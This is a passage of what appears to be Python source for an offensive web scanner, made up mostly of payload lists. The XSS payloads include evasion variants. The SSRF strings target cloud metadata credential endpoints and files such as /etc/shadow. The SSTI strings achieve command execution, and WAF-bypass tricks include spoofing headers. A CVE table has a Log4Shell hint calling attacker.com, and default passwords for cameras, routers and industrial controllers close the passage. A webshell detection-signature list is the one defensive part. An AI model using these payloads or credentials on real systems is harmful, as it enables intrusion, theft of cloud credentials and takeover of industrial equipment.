    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    "--><script>alert(1)</script>",
    "*/alert(1)/*",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>eval('ale'+'rt(1)')</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>setInterval('alert(1)',1)</script>",
    "<script>window['alert'](1)</script>",
    "<script>[].constructor.constructor('alert(1)')()</script>",
    "<script>(new Function('alert(1)'))()</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<script>\\u0061lert(1)</script>",
    "<script>a\\u006cert(1)</script>",
    "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<object data=javascript:alert(1)>",
    "<object data=\"data:text/html,<script>alert(1)</script>\">",
    "<embed src=javascript:alert(1)>",
    "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
    "<base href=\"javascript:alert(1)//\">",
    "<form action=javascript:alert(1)><input type=submit>",
    "<isindex action=javascript:alert(1) type=submit>",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<%2Fscript><script>alert(1)<%2Fscript>",
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<scr\tipt>alert(1)</scr\tipt>",
    "<script\x0d\x0a>alert(1)</script>",
    "<script/src=data:,alert(1)>",
    "<script/type=module>import('data:text/javascript,alert(1)')</script>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
    "<svg/onload=alert(1)>",
    "<svg\nonload=alert(1)>",
    "<svg\tonload=alert(1)>",
    "<svg onload\n=alert(1)>",
    "<svg onload\r=alert(1)>",
    "<svg onload\t=alert(1)>",
    "<svg/onload\n=alert(1)>",
    "<<script>alert(1)</script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>document.location='javascript:alert(1)'</script>",
    "<script>window.location='javascript:alert(1)'</script>",
    "<script>location.href='javascript:alert(1)'</script>",
    "<div onmouseover=alert(1)>hover</div>",
    "<div onclick=alert(1)>click</div>",
    "<div onmouseout=alert(1)>hover</div>",
    "<div onmousemove=alert(1)>hover</div>",
    "<div onkeydown=alert(1)>x</div>",
    "<div onkeypress=alert(1)>x</div>",
    "<div onkeyup=alert(1)>x</div>",
    "<table background=javascript:alert(1)>",
    "<td background=javascript:alert(1)>",
    "<div style=background:url(javascript:alert(1))>",
    "<div style=background-image:url(javascript:alert(1))>",
    "<div style=behavior:url(#default#time2) onbegin=alert(1)>",
    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">",
    "<meta http-equiv=set-cookie content=\"test\">",
    "<xmp><img src=x onerror=alert(1)></xmp>",
    "<noscript><img src=x onerror=alert(1)></noscript>",
    "<!--<img src=--><img src=x onerror=alert(1)//-->",
    "<![CDATA[<script>alert(1)</script>]]>",
    "<? echo '<script>alert(1)</script>'; ?>",
    "{{7*7}}","{{config}}","{{self}}","{{request}}",
    "${7*7}","${alert(1)}","#{7*7}","<%= 7*7 %>",
    "*{7*7}","@{7*7}","${system('id')}",
    "{{_self.env.setCache('file:///etc/passwd')}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{''.class.mro()[1].subclasses()}}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",
]

                                                                                 
                         
                                                                                 

EXTENDED_SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:5432/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:27017/",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:2181/",
    "http://127.0.0.1:4848/",
    "http://127.0.0.1:7001/",
    "http://0.0.0.0/",
    "http://0/",
    "http://0x7f000001/",
    "http://2130706433/",
    "http://017700000001/",
    "http://[::1]/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "http://localhost/",
    "http://localtest.me/",
    "http://127.127.127.127/",
    "http://127.0.1.1/",
    "http://127.1/",
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/info",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/project/",
    "http://169.254.169.254/computeMetadata/v1/instance/",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/",
    "http://metadata.google.internal/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://172.31.0.1/",
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///etc/hosts",
    "file:///etc/resolv.conf",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///var/www/html/.env",
    "file:///var/www/html/wp-config.php",
    "file://localhost/etc/passwd",
    "dict://127.0.0.1:6379/info",
    "dict://localhost:6379/keys *",
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    "gopher://127.0.0.1:11211/_%0aset%20ssrf%200%200%2010%0d%0aSSRFtesting%0d%0a",
    "ldap://127.0.0.1/",
    "ldaps://127.0.0.1/",
    "ftp://127.0.0.1/",
    "sftp://127.0.0.1/",
    "tftp://127.0.0.1/",
    "smtp://127.0.0.1:25/",
    "ssh://127.0.0.1:22/",
    "http://evil.com@127.0.0.1/",
    "http://127.0.0.1@evil.com/",
    "http://evil.com/redirect?url=http://127.0.0.1/",
    "http://127.0.0.1.evil.com/",
    "http://1270.0.1/",
    "http://0177.00.00.01/",
    "http://0x7f.0x0.0x0.0x1/",
    "http://127.000.000.001/",
    "http://2852039166/",
    "http://[::ffff:127.0.0.1]/",
    "http://[0000::1]/",
    "http://①②⑦.①.①.①/",
    "http://⓪.⓪.⓪.⓪/",
]

                                                                                 
                                          
                                                                                 

WAF_BYPASS_TECHNIQUES_REF = {
    "case_variation": [
        "ScRiPt","sElEcT","uNiOn","wHeRe","oR","aNd","nUlL",
        "ALTeRNaTe","DaTaBase","VeRsIoN","sYsTeM",
    ],
    "comment_insertion": [
        "SE/**/LECT","UN/**/ION","OR/**/1=1","AND/**/1=1",
        "SE/*!LECT*/","UN/*!ION*/","/*! UNION */","/*!50000UNION*/",
        "SE--\nLECT","OR--\n1=1","UN#\nION",
    ],
    "url_encoding": [
        "%27 (')","\"(%22)","(%28)","(%29)","space(%20)",
        "tab(%09)","newline(%0a)","cr(%0d)","%2527 (double-encoded ')",
        "%u0027 (unicode ')","\\u0027 (unicode escape)",
    ],
    "whitespace_variants": [
        "OR%09%091=1","OR%0a%0a1=1","OR%0d%0d1=1",
        "OR/**/1=1","OR/*!*/1=1","OR%00 1=1",
        "OR+1=1","OR%2b1=1",
    ],
    "header_tricks": [
        "X-Forwarded-For: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
        "X-Remote-IP: 127.0.0.1",
        "X-Remote-Addr: 127.0.0.1",
        "X-Host: 127.0.0.1",
        "X-Forwarded-Host: 127.0.0.1",
        "Forwarded: for=127.0.0.1",
        "True-Client-IP: 127.0.0.1",
        "Client-IP: 127.0.0.1",
        "X-Custom-IP-Authorization: 127.0.0.1",
        "X-ProxyUser-IP: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "X-Forwarded-For: 127.0.0.1, 127.0.0.1",
        "Cluster-Client-IP: 127.0.0.1",
        "Fastly-Client-IP: 127.0.0.1",
        "CF-Connecting-IP: 127.0.0.1",
        "X-Azure-ClientIP: 127.0.0.1",
        "X-Akamai-Client-IP: 127.0.0.1",
    ],
    "parameter_pollution": [
        "?a=1&a=2&a=<payload>",
        "?id=1/*&id=*/UNION SELECT...",
        "?param=safe&param=<payload>",
        "?id[]=1&id[]=2",
        "?id%5b%5d=1",
    ],
    "chunked_encoding": [
        "Transfer-Encoding: chunked (bypass some WAF inspection)",
        "Content-Encoding: gzip (compress payload)",
        "Content-Type: application/json (vs form-data)",
        "Accept-Encoding: br (brotli, different decompression)",
    ],
    "content_type_tricks": [
        "application/json with form payload",
        "text/xml with JSON payload",
        "application/x-www-form-urlencoded with JSON",
        "multipart/form-data boundary tricks",
        "application/xml with CDATA injection",
        "text/plain with injection in body",
    ],
    "obfuscation": [
        "Base64: SELECT -> U0VMRUNu",
        "Hex: 0x53454c454354",
        "char(): char(83,69,76,69,67,84)",
        "concat: CONCAT(0x53,0x45,0x4c,0x45,0x43,0x54)",
        "reverse: ESELECT -> REVERSE('TCELESREV')",
        "replace: SELECT -> SE||LECT (Oracle)",
    ],
    "path_tricks": [
        "/admin/./config -> /admin/config",
        "/admin/%2e/config -> /admin/config",
        "/admin//config -> /admin/config",
        "/admin/%2F%2Fconfig -> /admin//config",
        "/../admin -> /admin",
        "/a/../admin -> /admin",
    ],
}

                                                                                 
                         
                                                                                 

EXTENDED_SSTI_PAYLOADS = [
    "{{7*7}}","{{7*'7'}}","{{config}}","{{self}}",
    "{{request}}","{{request.environ}}",
    "{{settings}}","{{app}}","{{g}}","{{url_for}}",
    "{{config.items()}}","{{get_flashed_messages.__globals__}}",
    "${7*7}","${7*'7'}","${foobar}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
    "#{7*7}","#{7*'7'}",
    "<%= 7*7 %>","<%= system('id') %>","<%= `id` %>",
    "@{7*7}","@{config}","@{application.attributes}",
    "*{7*7}","*{T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{_self.env.setCache('file:///etc/passwd')}}{{_self.env.loadTemplate('passwd')}}",
    "{%- if True %}{{7*7}}{%- endif %}",
    "{%import os%}{{os.system('id')}}",
    "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
    "#set($x='')#set($rt = $x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    "#set($e=\"e\")#set($a=\"\")#set($s=$a.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",$a.class.forName(\"java.lang.String\")).invoke($a.class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\"))#set($x=$a.class.forName(\"java.io.InputStreamReader\").getDeclaredConstructors()[0])#set($x.accessible = true)#set($xx=$x.newInstance($s.getInputStream()))#set($y=$a.class.forName(\"java.io.BufferedReader\").getDeclaredConstructors()[0])#set($y.accessible = true)#set($yy=$y.newInstance($xx))$yy.readLine()",
    "{{'a'.__class__.__mro__[1].__subclasses__()}}",
    "{{'a'.__class__.__mro__}}",
    "{{g.get('builtins', {})}}",
    "{{config|attr('__class__')|attr('__init__')|attr('__globals__')}}",
    "{{request|attr('application')|attr('__globals__')|attr('__builtins__')|attr('__import__')('os')|attr('popen')('id')|attr('read')()}}",
    "{%- autoescape false %}{{7*7}}{%- endautoescape %}",
    "{% raw %}{{7*7}}{% endraw %}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "<#assign classLoader=object?api.class.protectionDomain.classLoader>",
    "${product.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",product.getClass().forName(\"java.lang.String\")).invoke(product.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}",
    "{{\"hello\".|upper}}","{{\"hello\".|length}}",
    "{{dump(config)}}","{{debug()}}","{{dump()}}",
    "{{env}}","{{app.env}}","{{app.config}}",
    "{{request.server}}","{{request.cookies}}",
    "{_import_('os').system('id')}",
    "<script>template</script>",
    "\\{{ 7*7 }}",
    "a{{b}}c","a${b}c","a#{b}c","a{b}c",
    "{{9999999+1}}","${9999999+1}","#{9999999+1}",
    "@{9999999+1}","*{9999999+1}",
    "<p th:text=\"${7*7}\">",
    "<p th:utext=\"${T(java.lang.Runtime).getRuntime().exec('id')}\">",
    "[[${7*7}]]","[(${7*7})]",
    "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
    "${@java.lang.Runtime@getRuntime().exec('id')}",
]

                                                                                 
                                                    
                                                                                 

WEBSHELL_DETECTION_SIGS = [
    "system(", "passthru(", "exec(", "shell_exec(",
    "popen(", "proc_open(", "eval(", "assert(",
    "preg_replace.*\/e", "create_function(",
    "include(", "include_once(", "require(",
    "file_get_contents(", "file_put_contents(",
    "fopen(", "fwrite(", "fputs(",
    "base64_decode(", "str_rot13(",
    "gzinflate(", "gzuncompress(", "gzdecode(",
    "str_replace(", "substr(", "chr(",
    "ord(", "hex2bin(", "pack(",
    "\\$_GET[", "\\$_POST[", "\\$_REQUEST[",
    "\\$_COOKIE[", "\\$_SERVER[", "\\$_FILES[",
    "\\$_ENV[", "\\$GLOBALS[",
    "<?php", "<%", "<asp:ObjectDataSource",
    "Runtime.getRuntime().exec(",
    "ProcessBuilder(", "Process(",
    "os.system(", "os.popen(", "subprocess.call(",
    "subprocess.Popen(", "subprocess.run(",
    "__import__('os')", "import os",
    "exec(", "eval(", "compile(",
    "getattr(", "setattr(", "delattr(",
    "open(", "read(", "write(",
    "socket.socket(", "socket.connect(",
    "requests.get(", "urllib.request.",
    "Runtime.exec(", ".execute(\"cmd\")",
    "new ProcessBuilder(", ".start()",
    "getRuntime().exec(",
    "ClassLoader", "defineClass(",
    "ObjectInputStream", "readObject(",
    "invoke(", "method.invoke(",
]

                                                                                 
                                       
                                                                                 

TECH_FINGERPRINT_EXTENDED = {
    "Laravel":          ["laravel_session","X-Powered-By: PHP","laravel","_token","csrf_token",
                         "Illuminate","laravel.log","storage/app"],
    "Symfony":          ["symfony","Symfony","X-Debug-Token","sfwdt","_sf2_meta"],
    "CodeIgniter":      ["ci_session","CodeIgniter","system/core"],
    "CakePHP":          ["cakephp","CakePHP","CAKEPHP"],
    "Yii":              ["yii","YII_","_yii_","yii2"],
    "Zend":             ["ZF_","Zend_Locale","__ZF","zend"],
    "ASP.NET":          ["ASP.NET","__VIEWSTATE","__EVENTVALIDATION","__VIEWSTATEGENERATOR",
                         ".aspx",".asp","X-AspNet-Version","X-AspNetMvc-Version"],
    "ASP.NET Core":     ["X-Powered-By: ASP.NET","aspnet",".NET Core","aspnetcore"],
    "Spring Boot":      ["X-Application-Context","X-Content-Type-Options","spring","actuator"],
    "Django":           ["csrftoken","csrfmiddlewaretoken","django","Django","X-CSRFToken"],
    "Flask":            ["Werkzeug","flask","session=eyJ","Flask","werkzeug"],
    "FastAPI":          ["FastAPI","uvicorn","starlette","fastapi"],
    "Ruby on Rails":    ["_rails_session","X-Request-Id","X-Runtime","rack.session","Rails"],
    "Sinatra":          ["sinatra","Sinatra"],
    "Express":          ["X-Powered-By: Express","express-session","connect.sid"],
    "Next.js":          ["__NEXT_DATA__","next.js","_next","X-Powered-By: Next.js"],
    "Nuxt.js":          ["nuxt","__nuxt","X-Powered-By: Nuxt.js"],
    "Vue.js":           ["__vue__","vue-router","vuex","Vue.js"],
    "React":            ["__REACT_DEVTOOLS","react-app","react-root","data-reactroot"],
    "Angular":          ["ng-version","angular","_angular_","ng-app"],
    "Svelte":           ["svelte","__svelte","SvelteKit"],
    "Gatsby":           ["gatsby","GATSBY_","___gatsby"],
    "Remix":            ["remix","__remix","REMIX_DEV"],
    "SolidJS":          ["solid-js","solidStart"],
    "Astro":            ["astro","Astro"],
    "Nginx":            ["Server: nginx","nginx"],
    "Apache":           ["Server: Apache","Apache","X-Powered-By: PHP"],
    "IIS":              ["Server: Microsoft-IIS","X-Powered-By: ASP.NET","X-AspNet-Version"],
    "Caddy":            ["Server: Caddy","caddy"],
    "Traefik":          ["Server: Traefik","traefik"],
    "HAProxy":          ["Server: haproxy","Via: haproxy"],
    "Varnish":          ["X-Varnish","Via: varnish","Age:"],
    "Cloudflare":       ["CF-RAY","CF-Cache-Status","Server: cloudflare","cf-request-id"],
    "Akamai":           ["X-Akamai","X-Cache: TCP_HIT","X-Check-Cacheable","AkamaiGHost"],
    "AWS CloudFront":   ["X-Amz-Cf-Id","X-Amz-Cf-Pop","Via: CloudFront"],
    "AWS ALB":          ["X-Amzn-Trace-Id"],
    "Fastly":           ["Fastly-IO","X-Fastly-Request-ID","Via: varnish"],
    "Sucuri":           ["X-Sucuri-ID","x-sucuri-cache"],
    "Incapsula":        ["X-Iinfo","incap_ses","visid_incap"],
    "ModSecurity":      ["ModSecurity","mod_security","NOYB"],
    "Vercel":           ["X-Vercel-Id","x-vercel-cache","Server: Vercel"],
    "Netlify":          ["X-Nf-Request-Id","X-Netlify","netlify"],
    "GitHub Pages":     ["Server: GitHub.com","Via: 1.1 varnish"],
    "Heroku":           ["X-Request-Id","X-Heroku","heroku"],
    "DigitalOcean":     ["x-do-app-origin"],
    "Kubernetes":       ["kube-","kubernetes","k8s"],
    "Docker":           ["docker","Docker"],
    "Squid":            ["Server: squid","Via: squid","X-Squid"],
    "Phusion Passenger":["X-Powered-By: Phusion Passenger","Phusion Passenger"],
    "Gunicorn":         ["Server: gunicorn","gunicorn"],
    "uWSGI":            ["Server: uWSGI","uwsgi"],
    "Unicorn":          ["Server: unicorn","unicorn"],
    "Puma":             ["Server: Puma","puma"],
    "Thin":             ["Server: thin","thin"],
    "WEBrick":          ["Server: WEBrick","WEBrick"],
    "Jetty":            ["Server: Jetty","Jetty"],
    "Tomcat":           ["Server: Apache-Coyote","Apache Tomcat","Coyote JSP"],
    "JBoss":            ["Server: JBoss","JBoss","EAP"],
    "WebLogic":         ["Server: WebLogic","Oracle WebLogic","BEA-"],
    "GlassFish":        ["Server: GlassFish","GlassFish"],
    "WildFly":          ["Server: WildFly","WildFly","JBOSS"],
    "Grafana":          ["grafana","Grafana","GrafanaVersion"],
    "Jenkins":          ["X-Jenkins","X-Jenkins-Session","Jenkins","hudson"],
    "GitLab":           ["GitLab","gitlab","X-Gitlab-Feature-Category"],
    "SonarQube":        ["SonarQube","sonarqube","sonar"],
    "Nexus":            ["Nexus","nexus","sonatype"],
    "phpMyAdmin":       ["phpMyAdmin","pma_lang","token","PMA_"],
    "Adminer":          ["Adminer","adminer"],
    "Kibana":           ["kbn-name","kbn-version","Kibana"],
    "Grafana":          ["grafana_session","Grafana","GrafanaVersion"],
    "Portainer":        ["portainer","Portainer"],
    "Rancher":          ["rancher","Rancher","R-sess"],
    "Superset":         ["superset","Apache Superset"],
    "Metabase":         ["metabase","Metabase","metabase.VERSION"],
    "Airflow":          ["airflow","Apache Airflow"],
    "Jupyter":          ["jupyter","Jupyter","ipython"],
    "Ghost":            ["ghost","Ghost","X-Ghost-Cache-Status"],
    "Strapi":           ["strapi","Strapi"],
    "Directus":         ["directus","Directus","x-directus-version"],
    "Ghost":            ["Ghost","ghost-version"],
    "Craft CMS":        ["craftcms","Craft CMS","craft"],
    "Sentry":           ["sentry-trace","X-Sentry-Rate-Limits","dsn"],
    "DataDog":          ["DD-Request-ID","dd-trace"],
    "New Relic":        ["X-NewRelic-App-Data","newrelic"],
    "Dynatrace":        ["X-dynaTrace","dtCookie","dtLatC"],
}

                                                                                 
                                                            
                                                                                 

CVE_SCANNER_CONTEXT = {
    "log4shell": {
        "cve": "CVE-2021-44228",
        "cvss": 10.0,
        "component": "Apache Log4j 2.x",
        "type": "RCE via JNDI injection",
        "payload_hint": "${jndi:ldap://attacker.com/a}",
        "affected_headers": ["User-Agent","X-Api-Version","X-Forwarded-For",
                             "Referer","Accept-Language","X-Forwarded-Host"],
        "patch": "Upgrade to Log4j 2.17.0+",
    },
    "spring4shell": {
        "cve": "CVE-2022-22965",
        "cvss": 9.8,
        "component": "Spring Framework 5.3.x < 5.3.18, 5.2.x < 5.2.20",
        "type": "RCE via class.module.classLoader data binding",
        "patch": "Upgrade to Spring 5.3.18+ or 5.2.20+",
    },
    "shellshock": {
        "cve": "CVE-2014-6271",
        "cvss": 10.0,
        "component": "GNU Bash < 4.3 patch 25",
        "type": "RCE via environment variable injection",
        "payload_hint": "() { :; }; echo vulnerable",
        "affected_endpoints": ["/cgi-bin/","/cgi/"],
        "patch": "Upgrade Bash",
    },
    "heartbleed": {
        "cve": "CVE-2014-0160",
        "cvss": 7.5,
        "component": "OpenSSL 1.0.1 - 1.0.1f",
        "type": "Sensitive memory disclosure via TLS heartbeat",
        "patch": "Upgrade to OpenSSL 1.0.1g+",
    },
    "wp_xmlrpc_bruteforce": {
        "cve": "CVE-2015-5622",
        "cvss": 6.8,
        "component": "WordPress xmlrpc.php",
        "type": "Brute-force via multicall",
        "patch": "Disable xmlrpc.php or add rate limiting",
    },
    "wp_user_enum": {
        "cve": "CVE-2009-2762",
        "cvss": 5.0,
        "component": "WordPress < 2.8.3",
        "type": "User enumeration via ?author= redirect",
        "patch": "Upgrade WordPress, block author enumeration",
    },
    "cve_2020_1938_ajp": {
        "cve": "CVE-2020-1938",
        "cvss": 9.8,
        "component": "Apache Tomcat AJP connector",
        "type": "File read / RCE via AJP connector (Ghostcat)",
        "patch": "Disable AJP or require secret in connector config",
    },
    "cve_2017_5638_struts": {
        "cve": "CVE-2017-5638",
        "cvss": 10.0,
        "component": "Apache Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10",
        "type": "RCE via Content-Type header (Jakarta Multipart parser)",
        "patch": "Upgrade to Struts 2.3.32+ or 2.5.10.1+",
    },
    "cve_2019_0708_rdp": {
        "cve": "CVE-2019-0708",
        "cvss": 9.8,
        "component": "Windows Remote Desktop Services",
        "type": "RCE (BlueKeep) — unauthenticated pre-auth",
        "patch": "Apply MS19-0708 patch",
    },
    "cve_2021_21985_vmware": {
        "cve": "CVE-2021-21985",
        "cvss": 9.8,
        "component": "VMware vCenter Server",
        "type": "RCE via vSAN Health Check plugin",
        "patch": "Upgrade to vCenter 7.0U2b / 6.7U3n / 6.5U3p",
    },
    "cve_2021_26855_exchange": {
        "cve": "CVE-2021-26855",
        "cvss": 9.8,
        "component": "Microsoft Exchange Server",
        "type": "SSRF → RCE (ProxyLogon)",
        "patch": "Apply KB5001779 security update",
    },
    "cve_2022_22947_spring_cloud": {
        "cve": "CVE-2022-22947",
        "cvss": 10.0,
        "component": "Spring Cloud Gateway",
        "type": "SSTI → RCE via Actuator endpoint",
        "patch": "Upgrade to Spring Cloud Gateway 3.1.1+ / 3.0.7+",
    },
    "cve_2023_46604_activemq": {
        "cve": "CVE-2023-46604",
        "cvss": 10.0,
        "component": "Apache ActiveMQ 5.15.16 and earlier",
        "type": "RCE via OpenWire protocol ClassInfo",
        "patch": "Upgrade to ActiveMQ 5.15.16 / 5.16.7 / 5.17.6 / 5.18.3",
    },
    "cve_2024_3400_palo_alto": {
        "cve": "CVE-2024-3400",
        "cvss": 10.0,
        "component": "Palo Alto Networks PAN-OS GlobalProtect",
        "type": "Unauthenticated RCE via OS command injection",
        "patch": "Upgrade PAN-OS. Disable GlobalProtect gateway if possible.",
    },
    "cve_2024_1709_connectwise": {
        "cve": "CVE-2024-1709",
        "cvss": 10.0,
        "component": "ConnectWise ScreenConnect < 23.9.8",
        "type": "Auth bypass via alternative path exploitation",
        "patch": "Upgrade to ScreenConnect 23.9.8+",
    },
    "cve_2023_4911_glibc": {
        "cve": "CVE-2023-4911",
        "cvss": 7.8,
        "component": "glibc ld.so (looney tunables)",
        "type": "Local privilege escalation via GLIBC_TUNABLES",
        "patch": "Update glibc",
    },
    "cve_2022_0847_dirty_pipe": {
        "cve": "CVE-2022-0847",
        "cvss": 7.8,
        "component": "Linux kernel 5.8 - 5.16.11",
        "type": "Local privilege escalation (Dirty Pipe)",
        "patch": "Upgrade kernel to 5.16.11+",
    },
    "cve_2021_3156_sudo": {
        "cve": "CVE-2021-3156",
        "cvss": 7.8,
        "component": "sudo 1.8.2 - 1.9.5p1",
        "type": "Heap buffer overflow → local root (Baron Samedit)",
        "patch": "Upgrade sudo to 1.9.5p2+",
    },
    "cve_2023_22515_confluence": {
        "cve": "CVE-2023-22515",
        "cvss": 10.0,
        "component": "Atlassian Confluence Server / Data Center",
        "type": "Broken access control → admin creation",
        "patch": "Upgrade to Confluence 8.3.3+",
    },
    "cve_2023_44487_http2": {
        "cve": "CVE-2023-44487",
        "cvss": 7.5,
        "component": "HTTP/2 implementations (Rapid Reset)",
        "type": "DoS via RST_STREAM flood",
        "patch": "Apply vendor patches (nginx, Apache, Go, etc.)",
    },
}

                                                                                 
                                                               
                                                                                 

IOT_DEFAULT_CREDS = {
    "Hikvision":       [("admin","12345"),("admin","Admin12345"),("admin","admin")],
    "Dahua":           [("admin","admin"),("admin",""),("admin","123456")],
    "Axis":            [("root","pass"),("admin","admin"),("root","root")],
    "Bosch":           [("admin","admin"),("service","service")],
    "Hanwha":          [("admin","no-password"),("admin","admin")],
    "Avigilon":        [("admin","admin123"),("admin","admin")],
    "Pelco":           [("admin","admin"),("pelco","pelco")],
    "Samsung":         [("admin","4321"),("admin","admin")],
    "Panasonic":       [("admin","12345"),("admin","admin")],
    "FLIR":            [("admin","admin"),("admin","fliradmin")],
    "Reolink":         [("admin",""),("admin","admin")],
    "Amcrest":         [("admin","admin"),("admin","password")],
    "ONVIF":           [("admin","12345"),("admin","admin")],
    "Foscam":          [("admin",""),("admin","admin")],
    "Wyze":            [("admin","admin"),("wyze","wyze")],
    "Arlo":            [("admin","admin")],
    "Nest":            [("admin","admin")],
    "Ring":            [("admin","admin")],
    "Lorex":           [("admin","admin")],
    "Swann":           [("admin","admin")],
    "Unifi":           [("ubnt","ubnt"),("admin","admin")],
    "Meraki":          [("admin","admin")],
    "Aruba":           [("admin","admin"),("admin","password")],
    "Ruckus":          [("admin","sp-admin"),("admin","admin")],
    "Huawei":          [("admin","admin"),("admin","Admin@12345"),("root","admin")],
    "ZTE":             [("admin","admin"),("admin","1234")],
    "Zyxel":           [("admin","1234"),("admin","admin"),("admin","password")],
    "Netopia":         [("admin","admin")],
    "2Wire":           [("admin","password"),("admin","admin")],
    "Belkin":          [("","admin")],
    "Buffalo":         [("root","password"),("admin","password")],
    "SMC":             [("admin","smcadmin"),("admin","admin")],
    "Sagem":           [("admin","admin")],
    "Comtrend":        [("admin","admin")],
    "Thomson":         [("admin","admin"),("user","user")],
    "BT HH":           [("admin","admin")],
    "Sky":             [("admin","admin"),("sky","sky")],
    "Virgin":          [("admin","changeme"),("admin","admin")],
    "Telia":           [("admin","admin")],
    "Telus":           [("admin","admin")],
    "Vodafone":        [("admin","admin")],
    "Orange":          [("admin","admin")],
    "Siemens":         [("admin","admin"),("siemens","siemens")],
    "ABB":             [("admin","admin"),("user","user")],
    "Schneider":       [("USER","USER"),("admin","admin")],
    "Allen Bradley":   [("admin","admin"),("allen","bradley")],
    "GE":              [("admin","admin"),("ControlST","servicetech")],
    "Honeywell":       [("admin","admin"),("engineer","engineer")],
    "Emerson":         [("admin","admin"),("emerson","emerson")],
    "Yokogawa":        [("admin","admin")],
    "Rockwell":        [("admin","admin"),("rockwell","rockwell")],
    "Mitsubishi":      [("admin","admin")],
    "Omron":           [("admin","admin")],
    "Phoenix Contact": [("admin","admin")],
    "Moxa":            [("admin","moxa"),("admin","admin")],
    "Digi":            [("root","dbps"),("admin","admin")],
    "Lantronix":       [("","system"),("admin","admin")],
    "Belden":          [("admin","admin")],
    "HMS":             [("admin","admin")],
    "ProSoft":         [("admin","admin")],
    "Kepware":         [("Administrator","")],
    "OSIsoft PI":      [("piadmin","piadmin"),("admin","admin")],
